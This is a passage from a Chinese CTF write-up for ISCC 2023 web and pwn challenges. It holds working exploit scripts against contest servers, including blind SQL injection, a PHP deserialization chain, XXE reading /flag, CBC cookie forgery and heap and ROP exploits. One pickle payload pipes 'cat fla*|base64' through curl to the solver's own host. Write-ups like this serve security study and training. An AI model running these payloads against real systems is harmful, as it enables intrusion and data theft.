        url = f&quot;http://47.94.14.162:10001/Details/search?id=-487561)||fl4g%20like%20binary%200x25&#123;bytes(i,'utf-8').hex()&#125;&#123;bytes(str2,'utf-8').hex()&#125;&#123;bytes(str1,'utf-8').hex()&#125;25--+&quot;#拿后以部分
        print(url)
        time.sleep(0.8)
        re = requests.get(url=url,cookies=cookies,headers=headers)
        if &quot;fl4g&quot; in re.text:
            str2=i
            str1=''
            flag = flag+i
            print(flag)
            break
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242201696.png" alt="image-20230524220105608"></p><p>逆序一下就是 flag</p><h3 id="where_is_your_love"><a class="anchor" href="#where_is_your_love">#</a> Where_is_your_love</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011306103.png" alt="image-20230501130615311"></p><p>还是看源码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011307763.png" alt="image-20230501130707717"></p><p>有三个文件，第一个是下载公钥</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011307627.png" alt="image-20230501130732584"></p><p>LoveStory.php 文件是题目入口</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011308789.png" alt="image-20230501130820726"></p><p>Enc.php</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251048876.png" alt="image-20230525104832716"></p><pre><code class="language-php">?&gt; &lt;?php
include(&quot;./xxxiscc.php&quot;);
class boy &#123;
    public $like;
    public function __destruct() &#123;
        echo &quot;能请你喝杯奶茶吗？&lt;br&gt;&quot;;
        @$this-&gt;like-&gt;make_friends();
    &#125;
    public function __toString() &#123;
        echo &quot;拱火大法好&lt;br&gt;&quot;;
        return $this-&gt;like-&gt;string;
    &#125;
&#125;

class girl &#123;
    private $boyname;
    public function __call($func, $args) &#123;
        echo &quot;我害羞羞&lt;br&gt;&quot;;
        isset($this-&gt;boyname-&gt;name);  
    &#125;
&#125;

class helper &#123;
    private $name;
    private $string;
    public function __construct($string) &#123;
        $this-&gt;string = $string;
    &#125;
    public function __isset($val) &#123;
        echo &quot;僚机上线&lt;br&gt;&quot;;
        echo $this-&gt;name;
    &#125;
    public function __get($name) &#123;
        echo &quot;僚机不懈努力&lt;br&gt;&quot;;
        $var = $this-&gt;$name;
        $var[$name]();
    &#125;
&#125;
class love_story &#123;
    public function love() &#123;
        echo &quot;爱情萌芽&lt;br&gt;&quot;;
        array_walk($this, function($make, $colo)&#123;
            echo &quot;坠入爱河，给你爱的密码&lt;br&gt;&quot;;
            if ($make[0] === &quot;girl_and_boy&quot; &amp;&amp; $colo === &quot;fall_in_love&quot;) &#123;
                global $flag;
                echo $flag;
            &#125;
        &#125;);
    &#125;
&#125;

if (isset($_GET[&quot;iscc&quot;])) &#123;
    $a=unserialize($_GET['iscc']);
&#125; else &#123;
    highlight_file(__FILE__);
&#125; 
</code></pre><p>反序列化</p><pre><code class="language-php">&lt;?php
class boy &#123;
    public $like;
    public function __destruct() &#123;
        @$this-&gt;like-&gt;make_friends();//触发call
    &#125;

    public function __toString() &#123;
        return $this-&gt;like-&gt;string;//触发get
    &#125;
&#125;

class girl &#123;
    public $boyname;
    public function __call($func, $args) &#123;
        isset($this-&gt;boyname-&gt;name);  //触发isset
    &#125;
&#125;

class helper &#123;
    public $name;
    public $string;
    public function __construct($string) &#123;
        $this-&gt;string = $string;
    &#125;
    public function __isset($val) &#123;
        echo $this-&gt;name;
    &#125;
    public function __get($name) &#123;
        $var = $this-&gt;$name;
        $var[$name]();
    &#125;
&#125;
class love_story &#123;
    public function love() &#123;//触发walk
        array_walk($this, function($make, $colo)&#123;
            if ($make[0] === &quot;girl_and_boy&quot; &amp;&amp; $colo === &quot;fall_in_love&quot;) &#123;
                global $flag;
                echo $flag;
            &#125;
        &#125;);
    &#125;
&#125;
$a = new boy();
$a-&gt;like = new girl();
$a-&gt;like-&gt;boyname = new helper(null);
$a-&gt;like-&gt;boyname-&gt;name = new boy();
$a-&gt;like-&gt;boyname-&gt;name-&gt;like = new helper(null);
$b = new love_story();
$b -&gt; fall_in_love =array(&quot;girl_and_boy&quot;);
$c = array(&quot;string&quot;=&gt;array($b,&quot;love&quot;));
$a-&gt;like-&gt;boyname-&gt;name-&gt;like-&gt;string = $c;
$a-&gt;like-&gt;boyname-&gt;name-&gt;like-&gt;name=&quot;0&quot;;
echo urlencode(serialize($a));
//O%3A3%3A%22boy%22%3A1%3A%7Bs%3A4%3A%22like%22%3BO%3A4%3A%22girl%22%3A1%3A%7Bs%3A7%3A%22boyname%22%3BO%3A6%3A%22helper%22%3A2%3A%7Bs%3A4%3A%22name%22%3BO%3A3%3A%22boy%22%3A1%3A%7Bs%3A4%3A%22like%22%3BO%3A6%3A%22helper%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A1%3A%220%22%3Bs%3A6%3A%22string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A10%3A%22love_story%22%3A1%3A%7Bs%3A12%3A%22fall_in_love%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A12%3A%22girl_and_boy%22%3B%7D%7Di%3A1%3Bs%3A4%3A%22love%22%3B%7D%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D%7D%7D
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011309481.png" alt="image-20230501130924433"></p><p>链子难度一般，最后 love 的调用挺有意思，这里使用数组过的，本地测了一下 php 是非线程安全的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305052008692.png" alt="image-20230505200851642"></p><p>这里通过前面的公钥来解密，先通过 openssl 拿到 n 和 e</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251102111.png" alt="image-20230525110216013"></p><pre><code>n=21632595061498942456591176284485458726074437255982049051386399661866343401307576418742779935973203520468696897782308820580710694887656859447653301575912839865540207043886422473424543631000613842175006881377927881354616669050512971265340129939652367389539089568185762381769176974757484155591541925924309034566325122477217195694622210444478497422147703839359963069352123250114163369656862332886519324535078617986837018261033100555378934126290111146362437878180948892817526628614714852292454750429061910217210651682864700027396878086089765753730027466491890569705897416499997534143482201450410155650707746775053846974603
</code></pre><p>用 yafu 分解 n</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251105609.png" alt="image-20230525110556501"></p><pre><code class="language-python">from Crypto.Util.number import *

p=147080233415299360057845495186390765586922902910770748924042642102066002833475419563625282038534033761523277282491713393841245804046571337610325158434942879464810055753965320619327164976752647165681046903418924945132096866002693037715397450918689064404951199247250188795306045444756953833882242163199922206967
q=147080233415299360057845495186390765586922902910770748924042642102066002833475419563625282038534033761523277282491713393841245804046571337610325158434942879464810055753965320619327164976752647165681046903418924945132096866002693037715397450918689064404951199247250188795306045444756953833882242163199922205709
n=21632595061498942456591176284485458726074437255982049051386399661866343401307576418742779935973203520468696897782308820580710694887656859447653301575912839865540207043886422473424543631000613842175006881377927881354616669050512971265340129939652367389539089568185762381769176974757484155591541925924309034566325122477217195694622210444478497422147703839359963069352123250114163369656862332886519324535078617986837018261033100555378934126290111146362437878180948892817526628614714852292454750429061910217210651682864700027396878086089765753730027466491890569705897416499997534143482201450410155650707746775053846974603
e=65537

d=inverse(e,(p-1)*(q-1))
f=open('F:\\迅雷下载\\letter.php', 'rb')
c = f.read()
c=bytes_to_long(c)
m=pow(c,d,n)
print(long_to_bytes(m))
f.close()
</code></pre><p>得到加密的脚本</p><pre><code class="language-php">&lt;?php
function enc($data)&#123;
        $str=&quot;&quot;;
        $a=strrev(str_rot13($data)); 
        for($i=0;$i&lt;strlen($a);$i++)&#123;
                $b=ord($a[$i])+10;
                $c=$b^100;
                $e=sprintf(&quot;%02x&quot;,$c);     
                $str.=$e; 
                &#125;
                return $str;
            &#125;
?&gt;
</code></pre><p>然后写一个解密脚本拿到 flag</p><pre><code class="language-python">import binascii

def rot13(message):
    res = ''
    for item in message:
        if (ord(item)&gt;= ord('A') and ord(item)&lt;= ord('M')) or (ord(item)&gt;= ord('a') and ord(item)&lt;= ord('m')):
            res += chr(ord(item)+13)
        elif (ord(item)&gt;= ord('N') and ord(item)&lt;= ord('Z')) or (ord(item)&gt;= ord('n') and ord(item)&lt;= ord('z')):
            res += chr(ord(item)-13)
        else:
            res += item
    return res

c = b'e35a31342f241b3f17081ae75e042b5f155e38163d285826e41936125b5a075910e13e3e3404'
c = binascii.a2b_hex(c)[::-1]
print(c)
m = ''
for i in c:
    t = (i ^ 100) - 10
    m = m + chr(t)
print(rot13(m))
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242202704.png" alt="image-20230524220234641"></p><h3 id="iscc单身节抽奖"><a class="anchor" href="#iscc单身节抽奖">#</a> ISCC 单身节抽奖</h3><p>登录后再后台看到一个注释的 token</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242203190.png" alt="image-20230524220358123"></p><p>反序列化后的内容，这里很明显是用户的账号信息被序列化后替换，构造 payload 然后使得 sdog 的值为 1</p><pre><code>ccccccc1234567&quot;;s:8:&quot;username&quot;;s:64:&quot;cccccccc&quot;;s:4:&quot;sdog&quot;;i:1;&#125;
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242240512.png" alt="image-20230524224010420"></p><p>进入后可以下载凭证，这里存在任意文件下载</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242322070.png" alt="image-20230524232217966"></p><p>这里下载 apidemo.php, 很明显的 xxe，构造 payload</p><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">name</span><span class="token punctuation">[</span><span class="token internal-subset"></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre>&lt;!ENTITY admin SYSTEM "file:///flag"></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">]</span><span class="token punctuation">></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&admin;">&amp;admin;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>isdog</span><span class="token punctuation">></span></span>singledog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>isdog</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>award</span><span class="token punctuation">></span></span>4090Ti<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>award</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242328350.png" alt="image-20230524232848249"></p><h3 id="上大号说话"><a class="anchor" href="#上大号说话">#</a> 上大号说话</h3><p>扫 web4 目录给的脚本 /.git</p><pre><code class="language-Python">class ED:
    def __init__(self):#通过随机数生成密钥
        self.file_key = ...  # 1Aa
        self.cipher_suite = Fernet(self.generate_key(self.file_key))#Fernet是对称加密的一种实现方式

    def crypto(self, base_str):
        return self.cipher_suite.encrypt(base_str)#加密

    @staticmethod
    def generate_key(key: str):#这里是生成密钥的函数
        key_byte = key.encode()
        return base64.urlsafe_b64encode(key_byte + b'0' * 28)#base64是一种编码方式，urlsafe_b64encode是base64的一种变种


def check_cookies(cookie):
    ed = ED()
    f, result = ed.decrypto(cookie)#ed.decrypto是解密
    black_list = ...
    if not result[0:2] == b'\x80\x03':#b'\x80\x03'是pickle序列化后的字节流的开头
        return False
    ...
    try:
        result = pickle.loads(result)#pickle.loads是将字节流反序列化成对象
        if result.name == 'mabaoguo' and result.random == mabaoguo.random and result.gongfu == mabaoguo.gongfu:#这里是判断对象的属性是否和预设的一致
            return flag
        else:
            return result.name
    except:
        return False


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        name = request.form['input_field']
        name = Member(name)
        name_pick = pickle.dumps(name, protocol=3)#pickle.dumps是将对象序列化成字节流，protocol是序列化时采用的协议版本，3是python3的协议版本
        name_pick = pickletools.optimize(name_pick)#pickletools.optimize是优化pickle序列化后的字节流
        ed = ED()
        response = make_response(redirect('/'))#make_response是将返回的内容封装成response对象
        response.set_cookie('name', ed.crypto(name_pick).decode())#set_cookie是设置cookie，ed.crypto是加密，decode是将字节流转换成字符串
        return response

    temp_cookies = request.cookies.get('name')#request.cookies.get是获取cookie

    if not temp_cookies:
        ...
    else:
        f = check_cookies(temp_cookies)
        ...


if __name__ == '__main__':
    app.run()
</code></pre><p>爆破出 file_key 密钥</p><pre><code class="language-python">import itertools
import pickle
import cryptography
import base64
from enum import member
from json import dump
import pickletools
from cryptography.fernet import Fernet


class ED:
    def __init__(self,key):
        # self.file_key = ...  # 1Aa
        self.file_key = key
        self.cipher_suite = Fernet(self.generate_key(self.file_key))

    def change(self, key):
        self.cipher_suite = Fernet(self.generate_key(key))

    def crypto(self, base_str):
        return self.cipher_suite.encrypt(base_str)
 

    def decrypto(self, base_str):
        print(self.cipher_suite.decrypt(base_str))
        return self.cipher_suite.decrypt(base_str)
    @staticmethod
    def generate_key(key: str):
        key_byte = key.encode()
        return base64.urlsafe_b64encode(key_byte + b'0' * 28)

# 定义字符集
charset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
# # 定义密钥长度范围
min_length = 4
max_length = 4
# 循环尝试所有可能的密钥组合
for length in range(min_length, max_length+1):
    for guess in itertools.product(charset, repeat=length):
        key = ''.join(guess)
        # 在此处使用密钥尝试打开加密文件或进行其他操作
        ed = ED(key=key)
        try:
            decrypted_data = ed.decrypto(
                'gAAAAABkU29cl7FsmN4fcEarM0esqSSe-ht2eaL-9DjMT2K18JGsAd0KFWaXtg4SslOG5ZIlv12E6BgRgUcrQR2bO0AwXvWLxSoi8Fv2x0XegfvFARjSMFH999KD93aMOfPK5uWuhlD9HaiRMKYVCChifxSsTkj_3WoSGrR__a0CZcnPo1xQcc4=')
            # 解密成功，返回结果
            print (decrypted_data)
            print(key)
        except cryptography.fernet.InvalidToken:
            # 密钥不正确，继续循环下一个密钥
            continue
</code></pre><p>这里接着打 python 反序列化</p><pre><code class="language-python">import base64
import requests
from fernet import Fernet


def generate_key(key: str):
    key_byte = key.encode()
    return base64.urlsafe_b64encode(key_byte + b'0' * 28)
exp = &quot;\x80\x03(Vcurl ip/`cat fla*|base64`\niposix\nsystem\n.&quot;#ip用自己的
f = Fernet(generate_key('5MbG'))
ck = f.encrypt(exp).decode()
print(requests.get(&quot;http://47.94.14.162:10004/&quot;,cookies=&#123;&quot;name&quot;:ck&#125;).text)
</code></pre><h3 id="iscc滥用职权-3"><a class="anchor" href="#iscc滥用职权-3">#</a> ISCC 滥用职权 - 3</h3><p>随便注册一个号登进去</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106390.png" alt="image-20230524210352073"></p><p>随便一改这里的 Auth key</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106741.png" alt="image-20230524210404157"></p><p>刷新</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106371.png" alt="image-20230524210415003"></p><p>所以直接用 cbc 翻转</p><pre><code class="language-python">import urllib.parse
import requests
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad
from Crypto.Util.strxor import strxor

# 这里可控的是iv

real_iv = base64.b64decode('WQ1eYrDvXCKueNoi7QHdPA==')
print(real_iv)


# url = &quot;http://47.94.14.162:10014/normal.php&quot;
# cookie = &#123;&quot;Auth_Key&quot;:urllib.parse.quote(&quot;WQ1eYrDvXCKueNoi7QHdPA==&quot;),&quot;Cyber_info&quot;:urllib.parse.quote(&quot;ukOsB0IG9nfqN8S0eUuC92aBh7sbNoJDcVYCMccBQo+dpoPHI91BXCryxiHjBKtsD0/N3rY5+mIvuHK22WDDV/AsYHMH8FzgAXAIRiGj09YC0N/XUWV78++LH0ovuQB4&quot;),&quot;PHPSESSID&quot;:&quot;acak5gn1r8pc670ve0lrel2u8u&quot;&#125;
# print(requests.get(url,cookies=cookie).text)

auth = 'a:3:&#123;s:8:&quot;deppartm&quot;;s:5:&quot;sale1&quot;;s:8:&quot;username&quot;;s:3:&quot;enj&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;'
c = base64.b64decode(&quot;ukOsB0IG9nfqN8S0eUuC92aBh7sbNoJDcVYCMccBQo+dpoPHI91BXCryxiHjBKtsD0/N3rY5+mIvuHK22WDDV/AsYHMH8FzgAXAIRiGj09YC0N/XUWV78++LH0ovuQB4&quot;)
c0 = c[:16]
m1 = b'tm&quot;;s:5:&quot;sale1&quot;;'
target1 = b'tm&quot;;s:5:&quot;techn&quot;;'
# c_是解密后未异或的值
c_1 = strxor(m1,c0)
# 伪造的第一个密文块
fake_c0 = strxor(c_1,target1)

new_c = fake_c0 + c[16:]
base_new_c = base64.b64encode(new_c)

# url = &quot;http://47.94.14.162:10014/normal.php&quot;
# cookie = &#123;&quot;Auth_Key&quot;:urllib.parse.quote(&quot;WQ1eYrDvXCKueNoi7QHdPA==&quot;),&quot;Cyber_info&quot;:urllib.parse.quote(base_new_c),&quot;PHPSESSID&quot;:&quot;acak5gn1r8pc670ve0lrel2u8u&quot;&#125;
# print(requests.get(url,cookies=cookie).text)

cc = 'LwrtjHvppj+1L9wrF8Fz43RtIjtzOjU6InRlY2huIjtzOjg6InVzZXJuYW1lIjtzOjM6Im00eCI7czo4OiJwYXNzd29yZCI7czo2OiIxMjM0NTYiO30='
cc0 = base64.b64decode(cc)[:16]
m0 = b'a:3:&#123;s:8:&quot;deppar'
cc_1 = strxor(real_iv,cc0)
fake_iv = strxor(cc_1,m0)

print(base64.b64encode(fake_iv))

url = &quot;http://47.94.14.162:10014/normal.php&quot;
cookie = &#123;&quot;Auth_Key&quot;:urllib.parse.quote(&quot;Fz2A1LB1wCUhdWJsirDPrQ==&quot;),&quot;Cyber_info&quot;:urllib.parse.quote(base_new_c),&quot;PHPSESSID&quot;:&quot;t4dod0sk4coouvcc4d0qa4f7nj&quot;&#125;
print(cookie)
print(requests.get(url,cookies=cookie).text)
</code></pre><p>发现 silly 是弱密码，登 silly</p><p>运行上面那个脚本，对 cookie 进行替换</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106391.png" alt="image-20230524210434917"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106639.png" alt="image-20230524210445482"></p><p>刷新即可成功混进去</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106399.png" alt="image-20230524210500029"></p><p>现在我们进入技术部门了，直接任命我自己，连胜两级</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106985.png" alt="image-20230524210521269"></p><p>一直升升到 100 多，然后再换一个号，用 enj 给这个号升级，升完以后再换过来，直到升到 10w</p><p>成功读取 flag</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106441.png" alt="image-20230524210533166"></p><h2 id="pwn"><a class="anchor" href="#pwn">#</a> PWN</h2><h3 id="三个愿望"><a class="anchor" href="#三个愿望">#</a> 三个愿望</h3><p>存在溢出和后门，格式化字符串泄露 canary，控制种子，预测随机数</p><pre><code class="language-py">from tools import *
from ctypes import *
context.log_level='debug'
p,e,libc=load('a','59.110.164.72:10001')
e = cdll.LoadLibrary('libc.so.6')
system=0x4011F5
payload=b'\x00'*0x16 
e.srand(0)
p.sendafter('Now you can make your first wish',payload)
p.recvuntil('Please give me a number!')
payload=str(e.rand() % 9 + 1)
p.sendline(payload)
payload=b'%11$p'
p.sendafter('Now you can make your second wish!',payload)
a=p.recv(1)
canary=int(p.recv(18),16)
p.recvuntil('Please give me a number!')
payload=str(2)
p.sendline(payload)
payload=b'a'*0x28+p64(canary)+p64(system)*2
p.sendafter('Now you can make your final wish!',payload)
p.interactive()  
</code></pre><h3 id="login"><a class="anchor" href="#login">#</a> Login</h3><p>有溢出，有 libc 地址，直接打 ret2libc</p><pre><code class="language-py">from tools import *
context.log_level='debug'
p,e,libc=load('Login','59.110.164.72:10000')
p.recvuntil('Here is a tip: ')
libc_base=int(p.recv(14),16)-0x3c48e0
system=libc_base+0x453a0
bin=libc_base+0x18ce57
pop_rdi=0x00000000004008c3
payload=b'a'*28+p32(0x15CC15CC)
p.sendafter('input the username:',payload)
payload=b'a'*0x28+p64(pop_rdi)+p64(bin)+p64(system)
p.sendafter('input the password:',payload)
p.interactive()  
</code></pre><h3 id="double"><a class="anchor" href="#double">#</a> Double</h3><p>刚开始以为是个菜单堆，不过发现程序给了后门，于是思路就是用 fastbin attack 让满足 if 的条件，通过检查后，因为存在栈溢出，打栈迁移执行 system (“/bin/sh”)</p><pre><code class="language-py">from tools import*
p,e,libc=load('double','59.110.164.72:10021')
def add(index,size):
    p.sendlineafter('请选择：',str(1))
    p.sendlineafter('请输入序号：',str(index))
    p.sendlineafter('请输入大小',str(size))
def delete(index):
    p.sendlineafter('请选择：',str(2))
    p.sendlineafter('请输入序号：',str(index))
def show(index):
    p.sendlineafter('请选择：',str(3))
    p.sendlineafter('请输入序号：',str(index))
def edit(index,content):
    p.sendlineafter('请选择：',str(4))
    p.sendlineafter('请输入序号：',str(index))
    p.sendlineafter('请输入编辑内容：',content)
add(0,0x400)
add(1,0x68)
delete(0)

add(2,0x400)
show(2)
libc_base=recv_libc()

malloc_hook=libc_base-0x10-88
log_addr('malloc_hook')
libc_base=libc_base-0x3c4b78
log_addr('libc_base')
add(3,0x68)
delete(3)
add(4,0x68)
delete(3)
edit(4,p64(0x6021E0-8))
add(5,0x68)
add(6,0x68)
edit(6,p64(0x15CC15CC)+b'a'*0x38+p64(0xCC51CC51))
p.sendlineafter('请选择：',str(5))
p.recvuntil('congratulations! Give you a reward:')
stack=int(p.recv(15),16)
payload=p64(0x0000000000400cb3)+p64(0x400CD8)+p64(0x4008FE)+b'a'*8+p64(stack-8)
p.recvuntil('please input what you want to say:')
p.sendline(payload)
p.interactive()
</code></pre><h3 id="困局"><a class="anchor" href="#困局">#</a> 困局</h3><p>格式化字符串泄露 canary，libc，栈地址。最后打 orw 绕过沙箱。</p><pre><code class="language-py">from tools import*
context.log_level='debug'
p,e,libc=load('Trapped','59.110.164.72:10066')
p.sendlineafter('This is a larger box\n',b'%9$p%15$p%p')
p.sendlineafter('We have a lot to talk about\n',b'a'*0x10)
canary=int(p.recv(18),16)
log_addr('canary')
libc_base=int(p.recv(14),16)-0x20840
log_addr('libc_base')
stack=int(p.recv(14),16)
log_addr('stack')
pop_rdi=libc_base+0x0000000000021112
pop_rsi=libc_base+0x00000000000202f8
pop_rdx=libc_base+0x0000000000001b92
read=libc_base+0xf7350
write=libc_base+0xf73b0
open=libc_base+0xf7130
debug(p,0x400804)
orw=p64(pop_rdi)+p64(stack+0xd0)+p64(pop_rsi)+p64(0)+p64(open)
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(stack-0x50)+p64(pop_rdx)+p64(0x50)+p64(read)
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(stack-0x50)+p64(pop_rdx)+p64(0x50)+p64(write)+b'flag\x00\x00\x00\x00'

p.sendlineafter('This is a larger box\n',b'%9$p%15$p')
p.sendlineafter('We have a lot to talk about\n',b'a'*0x28+p64(canary)+p64(0xdeadbeef)+orw)
p.interactive() 
</code></pre><h3 id="chef"><a class="anchor" href="#chef">#</a> chef</h3><p>简单题，存在堆溢出，直接打 fastbin attack 然后申请控制堆块，风水一下绕过 size 的检查，改指针为 got 表，用 show 函数泄露出 libc 地址，向 free_hook 写入 one_gadget</p><pre><code class="language-py">from tools import*
context.log_level='debug'
p,e,libc=load('chef','59.110.164.72:10031')
p.sendlineafter('Your choice:',str(4))
def show():
    p.sendlineafter('Your choice:',str(1))
def add(size,content):
    p.sendlineafter('Your choice:',str(2))
    p.sendlineafter('Please enter the price of food:',str(size))
    p.sendafter('Please enter the name of food:',content)
def edit(index,size,content):
    p.sendlineafter('Your choice:',str(3))
    p.sendlineafter('Please enter the index of food',str(index))
    p.sendlineafter('Please enter the price of food :',str(size))
    p.sendlineafter('Please enter the name of food',content)
def delete(index):
    p.sendlineafter('Your choice:',str(4))
    p.sendlineafter('Please enter the index of food:',str(index))
add(0x68,b'trunk') #0
add(0x58,'a')  #1
add(0x58,'a')  #2
add(0x58,'a')  #3
delete(2)
delete(1)
edit(0,0x78,b'a'*0x68+p64(0x61)+p64(0x6020a0-8))
add(0x58,'a') #4
add(0x58,p64(0x602018)) #5
show()
one=[0x45226,0x4527a,0xf03a4,0xf1247]
libc_base=recv_libc()-0x84540
log_addr('libc_base')
malloc_hook=libc_base+0x3c4b10
free_hook=libc_base+0x3c67a8
debug(p,add_p,delete_p,show_p,edit_p)
edit(2,0x78,p64(free_hook))
edit(0,0x78,p64(one[1]+libc_base))
delete(3)
p.interactive() 
</code></pre><h3 id="谜语人"><a class="anchor" href="#谜语人">#</a> 谜语人</h3><p>libc 给的不对，需要泄露出地址用 libcsearcher 来搜。</p><p>逆向分析后发现是菜单堆，只能申请 0x30 的堆块，存在一个 UAF 漏洞，因为缓冲区没有设置好，可以直接打 tcache bin attack 劫持到缓冲区的堆块上，然后申请出来再释放即可泄露出来 libc 地址。用 Libcsearcher 搜一下，然后打 tcache bin attack 劫持 free_hook</p><pre><code class="language-py">from tools import *
context.log_level='debug'

p,e,libc=load(&quot;Riddler.bk&quot;,&quot;59.110.164.72:10086&quot;)

def add(index):
    p.sendlineafter(&quot;Then?\n&quot;,str(2))
    p.sendlineafter(&quot;emmm?!\n&quot;,str(index))

def edit(index,content):
    p.sendlineafter(&quot;Then?\n&quot;,str(3))
    p.sendlineafter(&quot;emmm?!\n&quot;,str(index))
    #pause()
    p.sendline(content)


def show(index):
    p.sendlineafter(&quot;Then?\n&quot;,str(0))
    p.sendlineafter(&quot;emmm?!\n&quot;,str(index))


def delete(index):
    p.sendlineafter(&quot;Then?\n&quot;,str(1))
    p.sendlineafter(&quot;emmm?!\n&quot;,str(index))
add(4)
add(5)
add(6)
delete(5)
delete(6)
show(6)
heap_addr=u32(p.recv(4))
log_addr('heap_addr')
edit(6,p32(heap_addr-0x1040))
add(7)
add(8)
delete(8)
show(8)
p.recv(4)
leak_libc=u32(p.recv(4))-56-0x18#-0x1d87d8
# obj = LibcSearcher('__malloc_hook', leak_libc)
libc_base = leak_libc - 0x1d5788#obj.dump('__malloc_hook')
sys_addr = libc_base + 0x03cf10#obj.dump('system')
free_hook=libc_base+0x001d68d0#obj.dump('__free_hook')
log_addr('libc_base')
delete(7)
delete(4)
edit(4,p32(free_hook))
add(9)
edit(9,'/bin/sh\x00')
add(0x3)
edit(0x3,p32(sys_addr))
delete(0x9)
p.interactive()
</code></pre><h3 id="eat_num"><a class="anchor" href="#eat_num">#</a> eat_num</h3><p>原题，打 ret2dl 即可。因为是原题直接用模板打就行</p><pre><code class="language-py">from tools import*
p,e,libc=load('38','59.110.164.72:10067')
offset=0x4c
plt0 = e.get_section_by_name('.plt').header.sh_addr
rel_plt = e.get_section_by_name('.rel.plt').header.sh_addr
dynsym = e.get_section_by_name('.dynsym').header.sh_addr
dynstr = e.get_section_by_name('.dynstr').header.sh_addr
read_plt_addr=e.plt['read']
four_pop_ret=0x80484A8  #***
leave_ret_addr=0x8048428  #***
base_addr=0x0804a800
fake_sym_addr=base_addr+32
align=0x10-((fake_sym_addr-dynsym)&amp;0xf)
fake_sym_addr+=align
st_name=fake_sym_addr+0x10-dynstr
st_info=12
fake_sym=p32(st_name)+p32(0)+p32(0)+p32(st_info)
r_offset=e.got['read']
r_sym=(fake_sym_addr-dynsym)/0x10
r_type=0x7
r_info=(int(r_sym)&lt;&lt;8)+(r_type&amp;0xf)
reloc_index=base_addr-rel_plt+24
fake_rel_plt=p32(r_offset)+p32(r_info)
payload1=offset*b'a'+p32(read_plt_addr)+p32(four_pop_ret)+p32(0)+p32(base_addr)+p32(100)+p32(base_addr-4)+p32(leave_ret_addr)
p.send(payload1)
pause()
payload2=p32(plt0)+p32(reloc_index)
payload2+=b'bbbb'
payload2+=p32(base_addr+80)
payload2+=b'bbbb'
payload2+=b'bbbb'
payload2+=fake_rel_plt
payload2+=align*b'a'
payload2+=fake_sym
payload2+=b'system\x00'
payload2+=(80-len(payload2))*b'a'
payload2+=b'/bin/sh\x00'
payload2+=(100-len(payload2))*b'a'
p.send(payload2)
p.interactive()
</code></pre><h3 id="第二识势"><a class="anchor" href="#第二识势">#</a> 第二识势</h3><p>先打 house of force，把 data 段的内存给申请出来，向里面写入 0x10 个字符 a 来绕过 if 的检查。因为啥保护都没开，直接打 ret2shellcode 即可，如果不打 house of force 的话，默认的检查是过不去的</p><pre><code class="language-py">from tools import *
